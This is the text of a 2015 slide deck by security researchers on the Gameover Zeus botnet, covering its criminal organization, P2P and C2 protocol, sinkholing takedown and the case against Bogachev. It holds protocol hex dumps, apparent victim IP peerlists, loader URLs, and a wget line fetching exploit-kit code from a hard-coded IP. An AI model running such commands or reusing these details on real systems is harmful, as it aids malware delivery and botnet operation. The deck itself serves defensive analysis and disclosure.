Gameover Zeus ­ Bad Guys and Backends
Elliott Peterson, Michael Sandee, Tillmann Werner August 5, 2015

Cui Honorem, Honorem

Dr. Brett Stone-Gross, Dell SecureWorks Frank Ruiz, Fox-IT Dr. Christian Rossow, Saarland University Dennis Andriesse, VU University Amsterdam Dr. Christian Dietrich, CrowdStrike @kafeine UK NCA US DOJ CCIPS The ShadowServer Foundation And many others. . .

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

1 of 36

The Gameover Zeus Operation

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

2 of 36

Brief History of Zeus

Evolution of the Zeus Family

Version Zeus 1 Zeus 2
Murofet, Licat Gameover Zeus

Date Emerged in 2005 Emerged in 2009
September 2010 ­ September 2011 September 2011 ­ June 2014

Description Sold as crimeware kit Sold as crimeware kit, code for 2.0.8.9 leaked in 2011 Private builds Private builds, introduced P2P protocol

POST /gameover2.php HTTP/1.1 Accept: */* X-ID: 5555 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Host: pinkmite.com Content-Length: 3091 Connection: Keep-Alive

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

3 of 36

The Operation
Technology
· JabberZeus crew / Zeus 2.1.0.x · Domain generation algorithm (DGA) · Regexp targets · file infector
· September 11, 2011: Upgrade 2.1.0.x to Mapp 13 · Initially peer-to-peer + traditional comms via gameover2.php · Five years of existence

Monetization
· Focus on corporate banking, additionally affiliate-specific attacks · Individual operators often dropped other malware
· CryptoLocker ­ first in-house development, destructive · Not everybody used it: After locking the system, no fraud. . .

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

4 of 36

The Organization
Group Composition
· Experienced criminal organization · A mix of mainly Russian and Ukranian actors · Dual leadership · Support staff · More than 20 groups
3rd Party Services
· 3rd party techs to set up and secure systems · Preferred suppliers like loaders, exploit kits and spammers

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

5 of 36

Infrastructure
Bulletproof Hosting
· Exclusive servers together · Virtual IP addresses · New address in 2 business days · Exclusive and also very expensive

Proxies, Proxies Everywhere!
· Proxies towards peer-to-peer network · Proxies towards customers · Multiple physical servers · Zeus backend instances

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

6 of 36

Peer-to-Peer Network

Gameover Zeus (Mapp) Builder
· Internal name Mapp ­ command line application (still called zsb.exe) · Builder gets kbucket peer list from a bot
· kbucket: distributed hash table (DHT) terminology · Gameover Zeus uses hashes, but no table · Used to control the peer-to-peer network using a private RSA key · Can also enumerate peer-to-peer nodes

Peer-to-Peer Network Monitoring
· Debug builds of bots to spot and fix issues with the peer-to-peer layer · Backend had kbucket.php to extract reachable nodes · Backup DGA system to retrieve signed seed peerlists · Webinjects were able to use peer-to-peer functionality, too

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

7 of 36

C2 Protocol

000000 000010 000020 000030 000040 000050 000060 000070 000080 000090 0000a0 0000b0 0000c0 0000d0 0000e0 0000f0 000100 000110 000120 000130 000140

c7 d0 e2 7f e6 75 bd 0f a7 5b b8 e8 11 24 35 bf d3 96 ee 80 e4 40 1e 7f 7c 27 6a b2 a2 e0 42 8e bd 4e 33 f7 5c da e8 80 ca ed e8 20 5a b8 42 a0 08 f0 47 07 ce fb 7d 6e 5a 43 41 41 ee 10 d7 7b 92 32 d1 86 76 46 68 0a 46 0e 3d 1b 3c ca 4d cf 9d 58 77 d9 5c be c0 99 36 8d 78 0b bf 53 a9 df 44 d6 42 0a 00 48 e8 96 bb c2 43 0a 47 0c 8c 68 dd 6a b5 c7 d4 46 53 4f 28 21 78 e8 37 37 95 cf 4c 75 21 42 60 68 e8 a6 d0 6f 0f 87 4a 86 c7 5a d7 06 d8 e7 d0 f5 9b 0d 02 cc 94 e6 c6 58 ab f2 5e 4b 5e b2 1d 35 3c 81 ...

02 b1 f6 e2 90 ec 9b 72 30 82 cc 1a 03 78 a1 70 9d 80 ab 35 fb 0f fe 57 aa 7c df 17 3c 3e 98 13 92 58 69 ee 5b e8 d4 ce 66 b8 c0 99 25 4e f2 ee 0d 03 ca 25 27 2a fc 71 03 98 1b 5d f6 40 cb 95 61 a7 17 de 55 e8 2f 89 58 14 6e 77 97 2d 04 3a 1c a6 78 99 6c 7a 75 a6 fe cf e9 79 58 be e1 7b 97 49 6c 71 52 5a 4d 40 3f 5b 97 61 8d a2 4e af 0c 4d a0 0b 02 e9 51 9b c3 0a 26 bb 42 aa c1 95 b1 b6 76 fb 23 db 5d 0d b4 c0 86 1f ba 32 ba 89 c1 ff fa b4 54 80 7e c1 54 b9 6c ac 28 1f 5a 75 03 64 39 fc 8b db 7b 15

|.....u.........r| |.[...$5.0....x.p| |.....@.....5...W| ||'j...B..|..<>..| |.N3.\....Xi.[...| |... Z.B.f...%N..| |..G....n...%'*.q| |ZCAA.......].@..| |.2..vFh.a...U./.| |F.=.<.M.X.nw.-.:| |.Xw.\.....x.lzu.| |6.x..S.....yX...| |D.B..H...IlqRZM@| |..C.G..h?[.a..N.| |.j...FSO.M....Q.| |(!x.77....&.B...| |Lu!B`h....v.#.].| |.o..J..Z.....2..| |............T.~.| |.....X..T.l.(.Zu| |^K^..5<..d9.....|

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

8 of 36

C2 Protocol

000000 000010 000020 000030 000040 000050 000060 000070 000080 000090 0000a0 0000b0 0000c0 0000d0 0000e0 0000f0 000100 000110 000120 000130 000140

50 4f 53 54 20 2f 77 72 2f 31 2e 31 0d 0a 48 6f 75 6c 74 0d 0a 41 63 63 64 69 6e 67 3a 0d 0a 43 6e 3a 20 63 6c 6f 73 65 74 2d 4c 65 6e 67 74 68 2d 49 44 3a 20 37 37 37 55 13 e7 98 b8 f0 35 01 aa ee 00 00 00 00 00 00 8a b7 2f 62 c4 1a 5e d4 00 00 00 00 00 17 00 00 9a 24 45 60 94 51 43 79 95 52 42 7c 66 00 00 00 14 00 00 00 81 4c f2 55 d4 3f cd 9b ef c8 69 3d 08 00 00 00 08 00 00 00 c9 00 00 00 00 00 00 00 ee 07 3c d6 c8 00 00 00 10 00 00 00 15 36 0e a8 9a df 4a 5e ca 00 00 00 04 00 00 00 ca 07 3c d6 ...

69 74 65 20 48 54 54 50 73 74 3a 20 64 65 66 61 65 70 74 2d 45 6e 63 6f 6f 6e 6e 65 63 74 69 6f 0d 0a 43 6f 6e 74 65 6e 3a 20 32 33 38 0d 0a 58 37 0d 0a 0d 0a 14 19 f4 e3 9a 94 96 2a 11 5c be 00 07 3c d6 3f 15 81 00 3f 9b 5e 88 8e 65 00 00 00 17 00 00 00 36 42 7c e1 53 36 0e 95 23 35 7d 00 00 00 00 14 00 00 00 b1 13 1d b1 4f ad f8 61 67 00 00 00 00 00 00 00 04 6f 5d a5 02 74 0e e2 04 00 00 00 04 00 00 00 00 00 00 00 10 00 00 00 f1 06 82 54 f3 9f 6e 0f 00 00 00 00 04 00 00 00 cb 00 00 00 00 00 00 00

|POST /write HTTP| |/1.1..Host: defa| |ult..Accept-Enco| |ding:..Connectio| |n: close..Conten| |t-Length: 238..X| |-ID: 7777.......| |U.....5.....*.\.| |..........<.?...| |../b..^.?.^..e..| |.............6B|| |.$E`.QCy.S6..#5.| |.RB|f...........| |.....L.U....O..a| |.?....i=g.......| |.........o]..t..| |................| |..<.............| |.....6.....T..n.| |..J^............| |......<.........|

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

9 of 36

Configuration

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

10 of 36

Commands

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

11 of 36

Espionage

Things you do not expect to see in financial malware: Additional malware dropped to spy on systems.

Georgia
Targeting intelligence agencies and other government information

Turkey
Targeting government information but also information pertaining to conflict in Syria

Ukraine
Started with recent conflict in Eastern Ukraine and Crimea, specifically looking for information from intelligence agencies

OPEC
Older campaigns seemingly related to all countries involved with OPEC

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

12 of 36

P2P Poisoning Attack

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

13 of 36

Botnet Topology
P2P Layer
· Daily configuration updates · Weekly binary updates

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

14 of 36

Botnet Topology
P2P Layer
· Daily configuration updates · Weekly binary updates
Proxy Nodes
· Announced by special messages · Route C2 communication
· Stolen data · Commands

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

14 of 36

Botnet Topology
P2P Layer
· Daily configuration updates · Weekly binary updates

Proxy Nodes
· Announced by special messages · Route C2 communication
· Stolen data · Commands

C2 Proxies
· Plain HTTP proxies
· Additional layer between botnet and backend

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

14 of 36

Peer-to-Peer Protocol Primitives

Message Types

No. Meaning

Comment

00 Version Request

Ask for binary/config version

01 Version

Report version information

02 Peerlist Request

Ask peer for some neighbors

03 Peerlist

Report up to 10 neighbor peers

04 Data Request

Ask for binary or config

05 Data

Current binary or config

06 Proxy List

Contains list of proxy nodes

50 Proxy Announcement Used to propagate a proxy node

204 C2 Message

Sent to proxy nodes, wraps C2 data

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

15 of 36

Peerlist Request

Type Padding Length
Session ID Bot ID

02 50 c577aabe9d03a499601d2df4139e9c816bef8ce7 e74bce83d714216729aac4b7b238f14d89cf55eb

00000000 00000010 00000020 00000030 00000040 00000050 00000060 00000070 00000080 00000090 000000a0 000000b0 000000c0 000000d0

6f 94 02 50 c5 77 aa 13 9e 9c 81 6b ef 8c aa c4 b7 b2 38 f1 4d 5c f5 53 57 24 87 7a 01 a6 b5 e0 ab 4e a6 f0 ee c9 b6 72 c2 4b 12 da 17 dc 98 b8 17 b3 a2 a9 37 86 36 3a 2e d7 46 97 3c 35 de ca 88 38 f7 4a 14 74 8d 9f 29 24 72 7b 65 df ea 28 8a 2f 4a 06 76 be 4a 07 35 3a 56 d6 48 7e b8 65 d1 58

be 9d 03 a4 99 60 1d 2d f4 e7 4b ce 83 d7 14 21 67 29 89 cf 55 eb 53 4d 31 9b 94 6b bd 3a 24 0a 3b d2 f6 9a 35 86 ca 4c 9e b3 d8 a1 4a 9a c6 52 e4 12 58 ed fd 45 59 ab 1e 0a 4f 6c 7d 8e f7 f7 2e 26 25 64 b1 44 cf fe ff e2 b4 8d 14 53 3b 35 8a cb 29 af 99 a7 ba 10 e6 73 ad 1b ef ef b7 a2 ae 2b 97 2a ed 5b aa da 51 a7 a5 06 25 bf 09 9d 67 b3 c6 01 5f 41 65 4f 01

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

16 of 36

Peerlist Response

Type Padding Length
Session ID Bot ID

03 02 c577aabe9d03a499601d2df4139e9c816bef8ce7 517262b78f557456f15c7a65f370b8150d261b5f

Peerlist

517262b78f557456f15c7a65f370b8150d261b5f 51f1dab7004aaad6381c703a639dc758146cbd4f 5025d1bf2fb998c4b2256596587d7eb603efd7a2 50bc0620feef71b6a5d087d6f48637e95af1c5d5 522b0c1d8b7fb6cda19ea4407dc82f24a67008f0 52338ca13970ab8878908b9bafc70537fed2a85c 55c363c17e8b3528f2e20080e5fbc32eef6fcb28 53ce43f39cc89e3335ef2e36bf4ec5a9166f7c1b 53df3e87386c6c9d862126d00cabafb2344e82a6 56d9de127d908485aede02865d5725db684290b9

59.90.10.180:1026 125.23.117.36:7875 108.76.33.46:1732 81.90.26.57:7221 66.189.57.144:5807 86.57.196.12:9607 62.7.187.92:6200 59.92.54.113:9033 78.47.101.178:2514 219.76.74.28:1048

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

17 of 36

Attack
Sinkholing through Peer-to-Peer Poisoning
· Goal: Isolate bots, prevent normal operation · Method: Replace peerlist entries with sinkholes

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

18 of 36

Attack
Sinkholing through Peer-to-Peer Poisoning
· Goal: Isolate bots, prevent normal operation · Method: Replace peerlist entries with sinkholes

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

18 of 36

Sinkholing Attack

Poisoning Example
· Bot peerlist before the attack:

Bot ID

| IP address

| Port

------------------------------------------------------------------

c2ad2c7621e8cc9057e8ee0fe678acdf216f8d0f | 186.88.196.115 | 10355

c28df459e506e3fbaf0fe4e09c3e8a1fcc697f39 | 142.163.184.154 | 12631

3e6684b8016ad93410bc94803d1da9502239f582 | 208.41.173.138 | 13850

c19aff3ecf6a2e0443640baad118ee528ccd43ce | 95.104.110.191 | 15550

3d0445ac21017cf284191485fc045e23a4d65dba | 75.38.136.56 | 10169

5b68273785dc1a0e19d1461ccb5688e150528697 | 98.203.40.174 | 21918

e10fa5a555f3653837ceef2380da034dc7190261 | 174.134.88.28 | 19433

c1ff72dda4362153a43079ed35301537aaf56634 | 74.234.107.231 | 25975

93b2028482d876a9dd4a3b01b2265956f189aed4 | 190.206.20.161 | 29346

c3575bcd52b97c1484bee81dfa1bfcf5d3fd1343 | 79.113.161.10 | 16824

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

19 of 36

Sinkholing Attack

Poisoning Example
· Bot peerlist after the attack:

Bot ID

| IP address

| Port

------------------------------------------------------------------

f1d2d2f924e986ac86fdf7b36c94bcdf32beec15 | 192.168.0.1

| 14521

e242ed3bffccdf271b7fbaf34ed72d089537b42f | 10.0.0.1

| 25486

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

20 of 36

Sinkholing Attack
Things to Consider
· Peer-to-peer poisoning prevents propagation of information between peers · But C2 communication still possible

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

21 of 36

Controlling the Proxy Layer
Proxy Layer Poisoning Attack
· Peers maintain sorted lists of up to 20 proxies, regular checks if still active · Proxy list poisoning similar to peer list poisoning · Must force a switch to a new proxy · Happens only if current proxy (or backend) becomes unreachable · Requires collaboration with Internet Service Providers

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

22 of 36

Controlling the Proxy Layer
Proxy Layer Poisoning Attack
· Peers maintain sorted lists of up to 20 proxies, regular checks if still active · Proxy list poisoning similar to peer list poisoning · Must force a switch to a new proxy · Happens only if current proxy (or backend) becomes unreachable · Requires collaboration with Internet Service Providers

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

22 of 36

Controlling the DGA Layer
Backup Channel Takeover
· Reverse-engineered and reimplemented Domain Generation Algorithm · Pointed pre-computed DGA domains to a web server · Served a special seed peerlist from there
Top-Level Domains
· 5 US-based (.com, .org, .net, .biz, .info) · . . . and .ru · Required collaboration with domain registries
· Some volunteered · Others required a court order

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

23 of 36

Putting It All Together

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

24 of 36

Putting It All Together

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

24 of 36

Putting It All Together

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

24 of 36

Putting It All Together

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

24 of 36

Putting It All Together

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

24 of 36

Putting It All Together

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

24 of 36

Putting It All Together

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

24 of 36

The Criminal Investigation

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

25 of 36

Fraud Cycle
Modus Operandi
· Spam, infection, account takeover, fraud, international wire, DDoS attack against FI, funds laundered
· Losses ranged from $10,000 to $6,900,000

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

26 of 36

Infection Method
Blackhole Exploit Kit
· Specific configuration for Gameover Zeus · cron update.php file · Redirect to Google's Chrome page without proper referrer

wget -qO - http://69.194.160.216/cron update.php
./files/175dacb26 md5 is 796cddf7239eca64025cadce41d361d5 https://regatu written ./files/1e105e4bba md5 is 58787c143811f537b3fe529d52e755dd http: 58787c143811f537b3fe529d52e755dd equal md5 ./files/705a0d5d31 md5 is d77 module=EXETask&id=102&mode=getloader&name=/ldr int2.exe md5 is d7794674b 35e239b4a819601dc35b00f96087f26c http://91.242.217.34/iframecheck/?modul 35e239b4a819601dc35b00f96087f26c equal md5 ./files/d2d2b83280 md5 is b29 module=EXETask&id=53&mode=getloader&name=/ldr ninja.exe md5 is b29ce5968 166ea29c1d4bb0c84f129b347ca7bff9 http://91.242.217.34/iframecheck/?modul

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

27 of 36

Business Club

Superadmin Panel
"Starting on September 19, 2011, we are beginning to work through the panel where you now find yourselves. (fraudulent) Money transferors and drop (mule) managers are synchronizing their work through our panel, which enables a much greater optimization of the work process and increase in the productivity of our work. Starting from this moment, all drop (mule) managers with whom we are working, and all (fraudulent) money transferors who work with us are working through this panel. We wish you all successful and productive work."

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

28 of 36

Business Club

Superadmin Panel
"Starting on September 19, 2011, we are beginning to work through the panel where you now find yourselves. (fraudulent) Money transferors and drop (mule) managers are synchronizing their work through our panel, which enables a much greater optimization of the work process and increase in the productivity of our work. Starting from this moment, all drop (mule) managers with whom we are working, and all (fraudulent) money transferors who work with us are working through this panel. We wish you all successful and productive work."

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

28 of 36

Business Club

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

29 of 36

Business Club

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

29 of 36

Business Club

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

29 of 36

Ledger System

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

30 of 36

MegaPlan

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

31 of 36

Connecting the Dots

Personal Account
pa@rambler.ru pa@rambler.ru pa@rambler.ru pa@rambler.ru

Evgeniy Evgeniy Evgeniy Evgeniy

Bogachev Bogachev Bogachev Bogachev

Otradnaya 22 Otradnaya 22 Otradnaya 22 Otradnaya 22

46.158.238.206 212.117.170.62 46.158.20.187 46.158.147.144

Businessclub root Login
31.31.119.248 - - {29/Sep/2011: HTTP/1.1" 404 475 "-" "Mozilla/ (KHTML, like Gecko) Chrome/14.0 212.117.170.62 - - [29/Sep/2011 /sadmin.php?act=drops&wft HTTP/ Intel Mac OS X 10.7; rv:8.0a2) 212.117.170.62 - - [29/Sep/2011 200 718 "-" "Mozilla/5.0 (Macin

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

32 of 36

Evgeniy Bogachev

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

33 of 36

Civil Action
Temporary Restraining Order
· Ordered defendants (Bogachev) to cease activity · Authorized establishment of substitute server · Ordered Registries to redirect DGA traffic · Ordered Registries to cease CryptoLocker DGA registration · Ordered Internet Service Providers to block connections with DGA .ru domains

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

34 of 36

Profit?

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

35 of 36

Thank You.

B. Stone-Gross, T. Werner

Gameover Zeus ­ Bad Guys and Backends

36 of 36

